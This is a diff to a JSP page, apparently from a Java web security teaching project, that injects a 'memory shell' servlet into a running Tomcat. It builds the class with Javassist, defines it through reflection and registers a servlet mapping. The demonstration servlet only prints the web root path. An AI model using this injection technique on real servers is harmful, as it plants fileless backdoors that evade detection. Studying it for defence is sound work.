@@ -1,16 +1,48 @@
 <%@ page contentType="text/html;charset=UTF-8" %>
-<%@ page import="java.lang.reflect.Field" %>
 <%@ page import="org.apache.catalina.core.ApplicationContext" %>
 <%@ page import="org.apache.catalina.core.StandardContext" %>
+<%@ page import="java.lang.reflect.Field" %>
 <%@ page import="java.lang.reflect.Method" %>
 <%@ page import="org.apache.catalina.Wrapper" %>
-<%@ page import="static org.javaweb.vuln.utils.MemShellUtils.createServletClass" %>
+<%@ page import="javassist.ClassPool" %>
+<%@ page import="javassist.CtClass" %>
+<%@ page import="javassist.LoaderClassPath" %>
+<%@ page import="javassist.CtMethod" %>
+<%@ page import="java.lang.reflect.Modifier" %>
 <%!
     Class<?> definedClass(ClassLoader classLoader, byte[] bytes) throws Exception {
         Method method = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
         method.setAccessible(true);
 
         return (Class<?>) method.invoke(classLoader, bytes, 0, bytes.length);
+    }
+
+    byte[] createServletClass(ClassLoader classLoader) throws Exception {
+        // 使用Javassist创建类字节码
+        ClassPool classPool = ClassPool.getDefault();
+        classPool.insertClassPath(new LoaderClassPath(classLoader));
+        CtClass ctServletClass = classPool.makeClass(
+                "org.javaweb.servlet.HelloServlet", classPool.get("javax.servlet.http.HttpServlet")
+        );
+
+        CtClass[] args = new CtClass[]{
+                classPool.get("javax.servlet.http.HttpServletRequest"),
+                classPool.get("javax.servlet.http.HttpServletResponse")
+        };
+
+        CtMethod ctMethod = new CtMethod(CtClass.voidType, "service", args, ctServletClass);
+        ctMethod.setModifiers(Modifier.PUBLIC);
+        ctMethod.setBody("$2.getWriter().println($1.getRealPath(\"/\"));");
+
+        ctServletClass.addMethod(ctMethod);
+
+        // 生成类字节码
+        byte[] bytes = ctServletClass.toBytecode();
+
+        // 释放资源
+        ctServletClass.detach();
+
+        return bytes;
     }
 %>
 
@@ -54,5 +86,5 @@
         context.addServletMapping(servletPath, servletName);
     }
 
-    out.println("MemShellUtils: " + servletName + ", servletPath: " + servletPath);
+    out.println("MemShell Servlet: " + servletName + ", servletPath: " + servletPath);
 %>
